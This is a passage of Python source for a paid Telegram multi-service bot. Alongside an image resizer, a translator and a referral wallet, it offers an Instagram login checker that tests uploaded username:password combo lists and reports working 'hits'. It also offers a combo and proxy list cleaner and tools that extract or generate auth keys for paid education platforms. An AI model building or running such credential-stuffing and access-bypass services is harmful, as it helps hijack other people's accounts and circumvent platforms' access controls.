            f"💎 <b>Cost:</b> <code>{cost} 💎</code>\n\n"
            f"🌐 <b>How to use:</b>\n"
            f"First select your <b>Target Language</b> below, or send text directly (defaults to English 🇬🇧):"
        ),
        "svc_6": (
            f"{svc['title_fancy']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📌 <b>Engine:</b> <code>instagram_checker.py</code> (IG v269 Signed Mobile Login Checker)\n"
            f"💎 <b>Cost:</b> <code>{cost} 💎</code>\n\n"
            f"📤 <b>How to use:</b>\n"
            f"Send <code>username:password</code> combos (one per line, up to 15 per batch) OR upload a <code>combo.txt</code> file!"
        ),
        "svc_7": (
            f"{svc['title_fancy']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📌 <b>Engine:</b> <code>telegram_downloader.py</code> (Telethon Channel Downloader v2.1)\n"
            f"💎 <b>Cost:</b> <code>{cost} 💎</code>\n\n"
            f"📤 <b>How to use:</b>\n"
            f"Send your target channel username/ID and optional message range in format:\n"
            f"<code>@channel_username | all</code>  or  <code>@channel_username | 100-500</code>\n"
            f"The bot will generate your configured <code>config.json</code> + companion runner bundle!"
        ),
        "svc_8": (
            f"{svc['title_fancy']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📌 <b>Engine:</b> <code>kgs_by_igris.py</code> (Arolinks Code Extractor & Key Generator)\n"
            f"💎 <b>Cost:</b> <code>{cost} 💎</code>\n\n"
            f"📤 <b>How to use:</b>\n"
            f"Send an <code>https://arolinks.com/...</code> URL to extract its hidden auth code, OR type <code>generate</code> to generate a fresh 24-hour KGS <code>x-auth-key</code>!"
        ),
        "svc_9": (
            f"{svc['title_fancy']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📌 <b>Engine:</b> <code>kgs_by_igris.py</code> + <code>sigma_study_by_igris.py</code>\n"
            f"💎 <b>Cost:</b> <code>{cost} 💎</code>\n\n"
            f"📤 <b>How to use:</b>\n"
            f"Send a course keyword (e.g. <code>ssc</code>, <code>chsl</code>, <code>railway</code>) to compile all matching batch & subject summaries into a downloadable report!"
        ),
        "svc_10": (
            f"{svc['title_fancy']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📌 <b>Engine:</b> Combo Cleaner, Proxy Formatter & Range Tester\n"
            f"💎 <b>Cost:</b> <code>{cost} 💎</code>\n\n"
            f"📤 <b>How to use:</b>\n"
            f"Send a messy list of <code>user:pass</code> combos or <code>ip:port:user:pass</code> proxies (or upload a <code>.txt</code> file) to deduplicate, clean, and format!"
        ),
    }

    # If the admin replaced a builtin slot with a custom python_file / webhook / text, show custom description
    if svc.get("handler_type") != "builtin":
        prompt_text = (
            f"{svc['title_fancy']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📝 <b>Description:</b> {html_escape(svc['description'])}\n"
            f"💎 <b>Cost:</b> <code>{cost} 💎</code>\n"
            f"📂 <b>Module:</b> <code>{html_escape(svc['script_file'] or 'Custom Admin Service')}</code>\n\n"
            f"📤 <b>Send your input below to execute this service:</b>"
        )
    else:
        prompt_text = prompts.get(
            svc_code,
            (
                f"{svc['title_fancy']}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📝 <b>Description:</b> {html_escape(svc['description'])}\n"
                f"💎 <b>Cost:</b> <code>{cost} 💎</code>\n\n"
                f"📤 <b>Send your input below to execute this service:</b>"
            ),
        )

    extra_kb = []
    if svc_code == "svc_5" and svc.get("handler_type") == "builtin":
        lang_row = []
        for l_code, l_label in list(SUPPORTED_LANGS.items())[:6]:
            lang_row.append(
                {"text": l_label, "callback_data": f"tr_lang:{l_code}"}
            )
            if len(lang_row) == 3:
                extra_kb.append(lang_row)
                lang_row = []
        if lang_row:
            extra_kb.append(lang_row)
    elif svc_code == "svc_8" and svc.get("handler_type") == "builtin":
        extra_kb.append(
            [
                {
                    "text": "🔑 𝗔𝘂𝘁𝗼-𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲 𝗙𝗿𝗲𝘀𝗵 𝗞𝗚𝗦 𝗞𝗲𝘆",
                    "callback_data": "kgs_gen_key:now",
                }
            ]
        )

    set_state(user_id, f"await_svc:{svc_code}", {"target_lang": "en"})
    bot.edit_message(
        chat_id,
        message_id,
        prompt_text,
        reply_markup=build_back_home_kb(extra_kb),
    )


def execute_service_input(bot: TelegramBotClient, message: dict, state: dict):
    chat_id = message["chat"]["id"]
    user_id = message["from"]["id"]
    mode = state.get("mode", "")
    state_data = state.get("data", {})
    svc_code = mode.split(":", 1)[1]
    svc = get_service(svc_code)
    if not svc:
        clear_state(user_id)
        return

    cost = int(svc.get("cost", 1))
    text_in = (message.get("text") or message.get("caption") or "").strip()

    charged, rem_diamonds = charge_user_diamond(user_id, svc_code, cost)
    if not charged:
        bot.send_message(
            chat_id,
            f"⚠️ <b>Insufficient Diamonds!</b> You need <code>{cost} 💎</code> (Balance: <code>{rem_diamonds} 💎</code>). "
            f"Refer friends to earn up to 10 💎/day!",
            reply_markup=build_back_home_kb(),
        )
        clear_state(user_id)
        return

    bot.send_message(
        chat_id,
        f"⏳ <b>Processing {html_escape(svc['name'])}...</b>\n"
        f"💎 <b>Charged:</b> <code>{0 if is_user_admin(user_id) else cost} 💎</code> | "
        f"👛 <b>Remaining Balance:</b> <code>{rem_diamonds} 💎</code>",
    )

    # Check if admin replaced this service with a custom handler
    if svc.get("handler_type") != "builtin":
        _run_custom_service(bot, chat_id, user_id, svc, text_in, rem_diamonds)
        clear_state(user_id)
        return

    # ------------------------------------------------------------------
    # 1️⃣ SERVICE 1: 99KB IMAGE RESIZER
    # ------------------------------------------------------------------
    if svc_code == "svc_1":
        file_id = None
        orig_name = "image.jpg"
        if "photo" in message and message["photo"]:
            file_id = message["photo"][-1]["file_id"]
            orig_name = f"photo_{message['message_id']}.jpg"
        elif "document" in message and message["document"]:
            file_id = message["document"]["file_id"]
            orig_name = message["document"].get("file_name", "image.jpg")

        if not file_id:
            refund_user_diamond(user_id, cost)
            bot.send_message(
                chat_id,
                "⚠️ <b>Please send an image/photo or image document!</b> (Your 💎 was refunded.)",
                reply_markup=build_back_home_kb(),
            )
            return

        img_bytes, err_dl = bot.download_file_bytes(file_id)
        if not img_bytes:
            refund_user_diamond(user_id, cost)
            bot.send_message(
                chat_id,
                f"❌ <b>Failed to download image:</b> {html_escape(err_dl)} (💎 refunded)",
                reply_markup=build_back_home_kb(),
            )
            return

        orig_kb = len(img_bytes) / 1024.0
        resized_bytes, new_bytes_len, err_rs = resize_image_bulletproof_bytes(img_bytes)
        if not resized_bytes:
            refund_user_diamond(user_id, cost)
            bot.send_message(
                chat_id,
                f"❌ <b>Resize failed:</b> {html_escape(err_rs)} (💎 refunded)",
                reply_markup=build_back_home_kb(),
            )
            return

        new_kb = new_bytes_len / 1024.0
        base_stem = os.path.splitext(orig_name)[0]
        out_name = f"{base_stem}_99KB.jpg"
        caption = (
            f"🎯 <b>𝗕𝗨𝗟𝗟𝗘𝗧𝗣𝗥𝗢𝗢𝗙 𝟵𝟵.𝟵𝗞𝗕 𝗥𝗘𝗦𝗜𝗭𝗘 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📂 <b>File:</b> <code>{html_escape(out_name)}</code>\n"
            f"📊 <b>Original Size:</b> <code>{orig_kb:.1f} KB</code>\n"
            f"⚡ <b>New Size:</b> <code>{new_kb:.2f} KB</code>\n"
            f"💎 <b>Remaining Diamonds:</b> <code>{rem_diamonds} 💎</code>"
        )
        bot.send_document_bytes(
            chat_id,
            resized_bytes,
            out_name,
            caption=caption,
            reply_markup=build_back_home_kb(),
        )
        clear_state(user_id)
        return

    # ------------------------------------------------------------------
    # 2️⃣ SERVICE 2: PW LINK TO VIDEO DOWNLOADER
    # ------------------------------------------------------------------
    elif svc_code == "svc_2":
        if not text_in.startswith(("http://", "https://")):
            refund_user_diamond(user_id, cost)
            bot.send_message(
                chat_id,
                "⚠️ <b>Please send a valid http:// or https:// video URL!</b> (💎 refunded)",
                reply_markup=build_back_home_kb(),
            )
            return

        ok, result_path_or_err, size_mb = pw_download_video_to_mp4(text_in)
        if ok and os.path.exists(result_path_or_err):
            caption = (
                f"🎬 <b>𝗣𝗪 𝗩𝗜𝗗𝗘𝗢 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘!</b>\n"
                f"📦 <b>Size:</b> <code>{size_mb:.2f} MB</code>\n"
                f"💎 <b>Remaining Diamonds:</b> <code>{rem_diamonds} 💎</code>"
            )
            bot.send_document_path(
                chat_id,
                result_path_or_err,
                caption=caption,
                reply_markup=build_back_home_kb(),
            )
            shutil.rmtree(os.path.dirname(result_path_or_err), ignore_errors=True)
        else:
            bot.send_message(
                chat_id,
                f"ℹ️ <b>PW Video Inspection Result:</b>\n"
                f"<code>{html_escape(result_path_or_err)}</code>\n"
                f"🔗 <b>Source URL:</b> <code>{html_escape(text_in)}</code>\n"
                f"💎 <b>Remaining Diamonds:</b> <code>{rem_diamonds} 💎</code>",
                reply_markup=build_back_home_kb(),
            )
        clear_state(user_id)
        return

    # ------------------------------------------------------------------
    # 3️⃣ SERVICE 3: KGS EDUCATION PLATFORM BATCH SEARCH
    # ------------------------------------------------------------------
    elif svc_code == "svc_3":
        if not text_in:
            refund_user_diamond(user_id, cost)
            bot.send_message(
                chat_id,
                "⚠️ <b>Please enter a course keyword!</b> (💎 refunded)",
                reply_markup=build_back_home_kb(),
            )
            return

        try:
            batches = KGS_CLIENT.search_batches(text_in)
        except Exception as e:
            batches = []
            logger.warning(f"KGS search error: {e}")

        if not batches:
            bot.send_message(
                chat_id,
                f"❌ <b>No KGS batches found for keyword:</b> <code>{html_escape(text_in)}</code>\n"
                f"💎 <b>Remaining Diamonds:</b> <code>{rem_diamonds} 💎</code>",
                reply_markup=build_back_home_kb(),
            )
            clear_state(user_id)
            return

        kb_rows = []
        lines = [
            f"🎓 <b>𝗞𝗚𝗦 𝗕𝗔𝗧𝗖𝗛𝗘𝗦 𝗙𝗢𝗨𝗡𝗗 ({len(batches)}):</b>\n"
            f"🔍 <b>Query:</b> <code>{html_escape(text_in)}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        ]
        for i, b in enumerate(batches[:10], 1):
            b_id = b.get("id")
            b_title = b.get("title", f"Batch {i}")
            b_price = b.get("price", "N/A")
            lines.append(f"<b>{i}.</b> {html_escape(b_title)} — <code>₹{b_price}</code>")
            kb_rows.append(
                [
                    {
                        "text": f"📚 {i}. {b_title[:38]}",
                        "callback_data": f"kgs_b:{b_id}",
                    }
                ]
            )

        lines.append("\n👇 <b>Tap a batch below to view its Subjects, Videos & Notes:</b>")
        bot.send_message(
            chat_id,
            "\n".join(lines),
            reply_markup=build_back_home_kb(kb_rows),
        )
        clear_state(user_id)
        return

    # ------------------------------------------------------------------
    # 4️⃣ SERVICE 4: SIGMASTUDY BATCH SEARCH
    # ------------------------------------------------------------------
    elif svc_code == "svc_4":
        if not text_in:
            refund_user_diamond(user_id, cost)
            bot.send_message(
                chat_id,
                "⚠️ <b>Please enter a SigmaStudy batch keyword!</b> (💎 refunded)",
                reply_markup=build_back_home_kb(),
            )
            return

        try:
            batches = sigma_search_batches(text_in)
        except Exception as e:
            batches = []
            logger.warning(f"Sigma search error: {e}")

        if not batches:
            bot.send_message(
                chat_id,
                f"❌ <b>No SigmaStudy batches found for:</b> <code>{html_escape(text_in)}</code>",
                reply_markup=build_back_home_kb(),
            )
            clear_state(user_id)
            return

        kb_rows = []
        lines = [
            f"📡 <b>𝗦𝗜𝗚𝗠𝗔𝗦𝗧𝗨𝗗𝗬 𝗕𝗔𝗧𝗖𝗛𝗘𝗦 ({len(batches)}):</b>\n"
            f"🔍 <b>Query:</b> <code>{html_escape(text_in)}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        ]
        for i, b in enumerate(batches[:10], 1):
            b_id = b.get("_id")
            b_name = b.get("name", f"Batch {i}")
            lines.append(f"<b>{i}.</b> {html_escape(b_name)}")
            kb_rows.append(
                [
                    {
                        "text": f"📡 {i}. {b_name[:38]}",
                        "callback_data": f"sig_b:{b_id}",
                    }
                ]
            )

        lines.append("\n👇 <b>Tap a batch to browse Subjects & Chapters:</b>")
        bot.send_message(
            chat_id,
            "\n".join(lines),
            reply_markup=build_back_home_kb(kb_rows),
        )
        clear_state(user_id)
        return

    # ------------------------------------------------------------------
    # 5️⃣ SERVICE 5: GOOGLE CLOUD TRANSLATE API v2
    # ------------------------------------------------------------------
    elif svc_code == "svc_5":
        if not text_in:
            refund_user_diamond(user_id, cost)
            bot.send_message(
                chat_id,
                "⚠️ <b>Please send text to translate!</b> (💎 refunded)",
                reply_markup=build_back_home_kb(),
            )
            return

        target_lang = state_data.get("target_lang", "en")
        ok, translated, detected = google_translate_text(text_in, target_lang)
        lang_name = SUPPORTED_LANGS.get(target_lang, target_lang)
        if ok:
            reply = (
                f"🌐 <b>𝗚𝗢𝗢𝗚𝗟𝗘 𝗖𝗟𝗢𝗨𝗗 𝗧𝗥𝗔𝗡𝗦𝗟𝗔𝗧𝗜𝗢𝗡</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📥 <b>Detected Source:</b> <code>{html_escape(detected)}</code>\n"
                f"🎯 <b>Target Language:</b> {lang_name} (<code>{target_lang}</code>)\n\n"
                f"📝 <b>Original Text:</b>\n<code>{html_escape(text_in[:1200])}</code>\n\n"
                f"✅ <b>Translated Output:</b>\n<b>{html_escape(translated)}</b>\n\n"
                f"💎 <b>Remaining Diamonds:</b> <code>{rem_diamonds} 💎</code>"
            )
        else:
            reply = (
                f"❌ <b>Translation API Error:</b>\n<code>{html_escape(translated[:500])}</code>"
            )
        bot.send_message(chat_id, reply, reply_markup=build_back_home_kb())
        clear_state(user_id)
        return

    # ------------------------------------------------------------------
    # 6️⃣ SERVICE 6: INSTAGRAM CHECKER v2.0
    # ------------------------------------------------------------------
    elif svc_code == "svc_6":
        combos = []
        if "document" in message and message["document"]:
            raw_bytes, _ = bot.download_file_bytes(message["document"]["file_id"])
            if raw_bytes:
                combos = [
                    ln.strip()
                    for ln in raw_bytes.decode("utf-8", "ignore").splitlines()
                    if ":" in ln
                ]
        elif text_in:
            combos = [ln.strip() for ln in text_in.splitlines() if ":" in ln]

        if not combos:
            refund_user_diamond(user_id, cost)
            bot.send_message(
                chat_id,
                "⚠️ <b>Please send valid <code>username:password</code> lines or a <code>combo.txt</code> file!</b> (💎 refunded)",
                reply_markup=build_back_home_kb(),
            )
            return

        batch = combos[:15]
        hits, checkpoints, fails, errors_list = [], [], [], []
        for line in batch:
            u, p = line.split(":", 1)
            res = ig_check_single_combo(u.strip(), p.strip())
            r_type = res["result"]
            entry = f"{res['combo']} | {res['detail']}"
            if r_type == "HIT":
                hits.append(entry)
            elif r_type == "HIT_CHECKPOINT":
                checkpoints.append(entry)
            elif r_type == "FAIL":
                fails.append(entry)
            else:
                errors_list.append(entry)

        report_txt = (
            "=== INSTAGRAM CHECKER v2.0 REPORT ===\n"
            f"Checked: {len(batch)} (of {len(combos)} submitted)\n"
            f"Hits: {len(hits)} | Checkpoints: {len(checkpoints)} | Fails: {len(fails)} | Errors: {len(errors_list)}\n\n"
            "--- HITS ---\n" + ("\n".join(hits) or "None") + "\n\n"
            "--- CHECKPOINTS ---\n" + ("\n".join(checkpoints) or "None") + "\n\n"
            "--- FAILS ---\n" + ("\n".join(fails) or "None") + "\n\n"
            "--- ERRORS ---\n" + ("\n".join(errors_list) or "None") + "\n"
        )
        caption = (
            f"📸 <b>𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝘃𝟮.𝟬 𝗥𝗘𝗦𝗨𝗟𝗧𝗦</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ <b>Checked:</b> <code>{len(batch)}</code>\n"
            f"🎯 <b>Hits:</b> <code>{len(hits)}</code>  |  🔐 <b>Checkpoints:</b> <code>{len(checkpoints)}</code>\n"
            f"❌ <b>Fails:</b> <code>{len(fails)}</code>  |  ⚠️ <b>Errors:</b> <code>{len(errors_list)}</code>\n"
            f"💎 <b>Remaining Diamonds:</b> <code>{rem_diamonds} 💎</code>"
        )
        bot.send_document_bytes(
            chat_id,
            report_txt.encode("utf-8"),
            "ig_checker_results.txt",
            caption=caption,
            reply_markup=build_back_home_kb(),
        )
        clear_state(user_id)
        return

    # ------------------------------------------------------------------
    # 7️⃣ SERVICE 7: TELEGRAM CHANNEL DOWNLOADER CONFIG GENERATOR
    # ------------------------------------------------------------------
    elif svc_code == "svc_7":
        parts = [p.strip() for p in text_in.split("|")]
        channel_id = parts[0] if parts and parts[0] else "@example_channel"
        msg_range = parts[1] if len(parts) > 1 else "all"
        api_id = parts[2] if len(parts) > 2 else "YOUR_API_ID"
        api_hash = parts[3] if len(parts) > 3 else "YOUR_API_HASH"
        phone = parts[4] if len(parts) > 4 else "YOUR_PHONE_NUMBER"

        cfg_json = generate_telethon_config_bundle(
            channel_id, msg_range, api_id, api_hash, phone
        )
        caption = (
            f"📥 <b>𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗥 𝗖𝗢𝗡𝗙𝗜𝗚 𝗥𝗘𝗔𝗗𝗬!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📢 <b>Channel:</b> <code>{html_escape(channel_id)}</code>\n"
            f"🔢 <b>Message Range:</b> <code>{html_escape(msg_range)}</code>\n"
            f"📌 Place this <code>config.json</code> next to <code>telegram_downloader.py</code> and run:\n"
            f"<code>python telegram_downloader.py</code>\n"
            f"💎 <b>Remaining Diamonds:</b> <code>{rem_diamonds} 💎</code>"
        )
        bot.send_document_bytes(
            chat_id,
            cfg_json.encode("utf-8"),
            "config.json",
            caption=caption,
            reply_markup=build_back_home_kb(),
        )
        clear_state(user_id)
        return

    # ------------------------------------------------------------------
    # 8️⃣ SERVICE 8: AROLINKS AUTH-KEY EXTRACTOR & KGS KEY GENERATOR
    # ------------------------------------------------------------------
    elif svc_code == "svc_8":
        if text_in.lower() == "generate" or "arolinks" not in text_in.lower():
            ok, key, short_url = KGS_CLIENT.generate_fresh_auth_key()
            if ok:
                msg = (
                    f"🔑 <b>𝗞𝗚𝗦 𝟮𝟰𝗛 𝗔𝗨𝗧𝗛-𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🔗 <b>Short URL:</b> <code>{html_escape(short_url)}</code>\n"
                    f"✅ <b>Extracted x-auth-key:</b>\n<code>{html_escape(key)}</code>\n"
                    f"💎 <b>Remaining Diamonds:</b> <code>{rem_diamonds} 💎</code>"
                )
            else:
                msg = (
                    f"⚠️ <b>Short URL Generated:</b> <code>{html_escape(short_url or 'N/A')}</code>\n"
                    f"Could not auto-extract key on this attempt—open link or try again."
                )
        else:
            code = extract_arolinks_code(text_in)
            if code:
                msg = (
                    f"🔑 <b>𝗔𝗥𝗢𝗟𝗜𝗡𝗞𝗦 𝗖𝗢𝗗𝗘 𝗘𝗫𝗧𝗥𝗔𝗖𝗧𝗘𝗗!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🔗 <b>URL:</b> <code>{html_escape(text_in)}</code>\n"
                    f"✅ <b>Code / x-auth-key:</b> <code>{html_escape(code)}</code>\n"
                    f"💎 <b>Remaining Diamonds:</b> <code>{rem_diamonds} 💎</code>"
                )
            else:
                msg = f"❌ <b>Could not extract code from URL:</b> <code>{html_escape(text_in)}</code>"
        bot.send_message(chat_id, msg, reply_markup=build_back_home_kb())
        clear_state(user_id)
        return

    # ------------------------------------------------------------------
    # 9️⃣ SERVICE 9: BULK PDF NOTES & COURSE COMPILER
    # ------------------------------------------------------------------
    elif svc_code == "svc_9":
        kw = text_in or "ssc"
        report_lines = [
            "==================================================",
            "📚 KGS & SIGMASTUDY COURSE / NOTES CATALOG",
            f"Keyword: {kw} | Generated: {ist_now_str()}",
            "==================================================\n",
        ]
        try:
            kgs_b = KGS_CLIENT.search_batches(kw)
            report_lines.append(f"[KGS BATCHES FOUND: {len(kgs_b)}]")
            for b in kgs_b[:15]:
                report_lines.append(
                    f" • ID: {b.get('id')} | {b.get('title')} | ₹{b.get('price')}"
                )
        except Exception as e:
            report_lines.append(f"[KGS Error: {e}]")

        report_lines.append("")
        try:
            sig_b = sigma_search_batches(kw)
            report_lines.append(f"[SIGMASTUDY BATCHES FOUND: {len(sig_b)}]")
            for b in sig_b[:15]:
                report_lines.append(f" • ID: {b.get('_id')} | {b.get('name')}")
        except Exception as e:
            report_lines.append(f"[SigmaStudy Error: {e}]")

        txt_bytes = "\n".join(report_lines).encode("utf-8")
        bot.send_document_bytes(
            chat_id,
            txt_bytes,
            f"course_catalog_{kw[:20]}.txt",
            caption=(
                f"📚 <b>𝗕𝗨𝗟𝗞 𝗖𝗢𝗨𝗥𝗦𝗘 & 𝗡𝗢𝗧𝗘𝗦 𝗖𝗔𝗧𝗔𝗟𝗢𝗚 𝗥𝗘𝗔𝗗𝗬!</b>\n"
                f"🔍 <b>Keyword:</b> <code>{html_escape(kw)}</code>\n"
                f"💎 <b>Remaining Diamonds:</b> <code>{rem_diamonds} 💎</code>"
            ),
            reply_markup=build_back_home_kb(),
        )
        clear_state(user_id)
        return

    # ------------------------------------------------------------------
    # 🔟 SERVICE 10: COMBO & PROXY CLEANER UTILITY
    # ------------------------------------------------------------------
    elif svc_code == "svc_10":
        raw_lines = []
        if "document" in message and message["document"]:
            b_data, _ = bot.download_file_bytes(message["document"]["file_id"])
            if b_data:
                raw_lines = b_data.decode("utf-8", "ignore").splitlines()
        elif text_in:
            raw_lines = text_in.splitlines()

        if not raw_lines:
            refund_user_diamond(user_id, cost)
            bot.send_message(
                chat_id,
                "⚠️ <b>Please send text lines or upload a .txt file!</b> (💎 refunded)",
                reply_markup=build_back_home_kb(),
            )
            return

        cleaned = []
        seen = set()
        for ln in raw_lines:
            ln = ln.strip()
            if not ln or ":" not in ln:
                continue
            if ln not in seen:
                seen.add(ln)
                cleaned.append(ln)

        out_bytes = "\n".join(cleaned).encode("utf-8")
        caption = (
            f"⚡ <b>𝗖𝗢𝗠𝗕𝗢 / 𝗣𝗥𝗢𝗫𝗬 𝗖𝗟𝗘𝗔𝗡𝗘𝗥 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📥 <b>Input Lines:</b> <code>{len(raw_lines)}</code>\n"
            f"🧹 <b>Duplicates / Invalid Removed:</b> <code>{len(raw_lines) - len(cleaned)}</code>\n"
            f"✅ <b>Clean Unique Lines:</b> <code>{len(cleaned)}</code>\n"
            f"💎 <b>Remaining Diamonds:</b> <code>{rem_diamonds} 💎</code>"
        )
        bot.send_document_bytes(
            chat_id,
            out_bytes,
            "cleaned_combos.txt",
            caption=caption,
            reply_markup=build_back_home_kb(),
        )
        clear_state(user_id)
        return

    # Fallback for any custom slot
    _run_custom_service(bot, chat_id, user_id, svc, text_in, rem_diamonds)
    clear_state(user_id)


def _run_custom_service(
    bot: TelegramBotClient,
    chat_id: int,
    user_id: int,
    svc: dict,
    text_in: str,
    rem_diamonds: int,
):
    h_type = svc.get("handler_type", "text")
    script_file = svc.get("script_file", "")
    cfg = {}
    try:
        cfg = json.loads(svc.get("config_json") or "{}")
    except Exception:
        pass

    if h_type == "python_file" and script_file and os.path.exists(script_file):
        try:
            proc = subprocess.run(
                [sys.executable, script_file],
                input=text_in,
                capture_output=True,
                text=True,
                timeout=35,
            )
            output = (proc.stdout or "") + (f"\n{proc.stderr}" if proc.stderr else "")
            output = output.strip() or "✅ Script executed with no console output."
        except Exception as e:
            output = f"❌ Script execution error: {e}"

        bot.send_message(
            chat_id,
            f"⚡ <b>{html_escape(svc['title_fancy'])} — Output:</b>\n"
            f"<pre>{html_escape(output[:3500])}</pre>\n"
            f"💎 <b>Remaining Diamonds:</b> <code>{rem_diamonds} 💎</code>",
            reply_markup=build_back_home_kb(),
        )
    elif h_type == "api_webhook" and cfg.get("url"):
        try:
            r = requests.post(
                cfg["url"],
                json={"user_id": user_id, "input": text_in},
                timeout=20,
            )
            resp_text = r.text[:3000]
        except Exception as e:
            resp_text = f"Webhook Error: {e}"
        bot.send_message(
            chat_id,
            f"🌐 <b>{html_escape(svc['title_fancy'])} Response:</b>\n"
            f"<code>{html_escape(resp_text)}</code>\n"
            f"💎 <b>Remaining Diamonds:</b> <code>{rem_diamonds} 💎</code>",
            reply_markup=build_back_home_kb(),
        )
    else:
        template = cfg.get("response_template") or svc["description"]
        bot.send_message(
            chat_id,
            f"✅ <b>{html_escape(svc['title_fancy'])}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📥 <b>Your Input:</b> <code>{html_escape(text_in)}</code>\n\n"
            f"{html_escape(template)}\n\n"
            f"💎 <b>Remaining Diamonds:</b> <code>{rem_diamonds} 💎</code>",
            reply_markup=build_back_home_kb(),
        )


# ============================================================================
# 🔄 CALLBACK QUERY ROUTER (MENUS, KGS/SIGMA DRILLDOWN, & ADMIN PANEL)
# ============================================================================

def handle_callback_query(bot: TelegramBotClient, cb: dict):
    cb_id = cb["id"]
    user_info = cb["from"]
    user_id = user_info["id"]
    msg = cb.get("message", {})
    chat_id = msg.get("chat", {}).get("id", user_id)
    message_id = msg.get("message_id")
    data = cb.get("data", "")

    user, _, _ = get_or_create_user(
        user_id,
        user_info.get("username", ""),
        user_info.get("first_name", ""),
    )

    if user.get("is_banned") == 1 and not is_user_admin(user_id):
        bot.answer_callback(cb_id, "🚫 Your account is banned from this bot.", show_alert=True)
        return

    # ------------------------------------------------------------------
    # MAIN MENU & WALLET & REFERRAL TABS
    # ------------------------------------------------------------------
    if data == "menu:home":
        clear_state(user_id)
        bot.answer_callback(cb_id, "🏠 Main Menu")
        bot.edit_message(
            chat_id,
            message_id,
            render_home_dashboard(bot, user),
            reply_markup=build_main_menu_keyboard(user_id),
        )
        return

    if data == "menu:wallet":
        bot.answer_callback(cb_id, "💎 Diamond Wallet")
        earned_today, max_daily = get_user_daily_ref_progress(user_id)
        ref_link = f"https://t.me/{bot.bot_username}?start=ref_{user_id}"
        text = (
            f"💎 <b>𝗬𝗢𝗨𝗥 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗗𝗜𝗔𝗠𝗢𝗡𝗗 𝗪𝗔𝗟𝗟𝗘𝗧</b> 💎\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Holder:</b> {html_escape(user['first_name'])} (<code>{user_id}</code>)\n"
            f"👛 <b>Current Balance:</b> <b>{user['diamonds']} 💎 Diamonds</b>\n"
            f"⚡ <b>Total Services Used:</b> <code>{user['total_services_used']}</code>\n"
            f"👥 <b>Total Friends Referred:</b> <code>{user['total_referrals']}</code>\n"
            f"📅 <b>Today's Referral Diamonds:</b> <code>{earned_today} / {max_daily} 💎</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 <b>How Diamonds Work:</b>\n"
            f"• Sign-Up Bonus: <b>+{get_setting('signup_bonus', '5')} 💎</b>\n"
            f"• 1 Service Use = <b>{get_setting('default_service_cost', '1')} 💎</b>\n"
            f"• 1 Friend Referral = <b>+{get_setting('referral_reward', '1')} 💎</b> (up to {max_daily} 💎/day)\n\n"
            f"🔗 <b>Your Referral Link:</b>\n<code>{ref_link}</code>"
        )
        bot.edit_message(chat_id, message_id, text, reply_markup=build_back_home_kb())
        return

    if data == "menu:refer":
        bot.answer_callback(cb_id, "🎁 Refer & Earn")
        earned_today, max_daily = get_user_daily_ref_progress(user_id)
        ref_link = f"https://t.me/{bot.bot_username}?start=ref_{user_id}"
        bar_filled = min(10, int((earned_today / max(1, max_daily)) * 10))
        progress_bar = "🟩" * bar_filled + "⬜" * (10 - bar_filled)
        text = (
            f"🎁 <b>𝗥𝗘𝗙𝗘𝗥 & 𝗘𝗔𝗥𝗡 𝗙𝗥𝗘𝗘 𝗗𝗜𝗔𝗠𝗢𝗡𝗗𝗦</b> 🎁\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Share your unique invite link with friends and groups!\n\n"
            f"💎 <b>Reward per Referral:</b> <code>+{get_setting('referral_reward', '1')} 💎 Diamond</code>\n"
            f"🔥 <b>Daily Earning Cap:</b> <code>{max_daily} 💎 Diamonds / Day</code>\n\n"
            f"📊 <b>Today's Progress ({earned_today}/{max_daily} 💎):</b>\n"
            f"{progress_bar}\n\n"
            f"👥 <b>All-Time Referrals:</b> <code>{user['total_referrals']} friends</code>\n\n"
            f"🔗 <b>Tap to Copy Your Invite Link:</b>\n"
            f"<code>{ref_link}</code>"
        )
        share_url = f"https://t.me/share/url?url={ref_link}&text=Join%20this%20Premium%20Multi-Service%20Bot%20and%20get%205%20Free%20Diamonds!"
        bot.edit_message(
            chat_id,
            message_id,
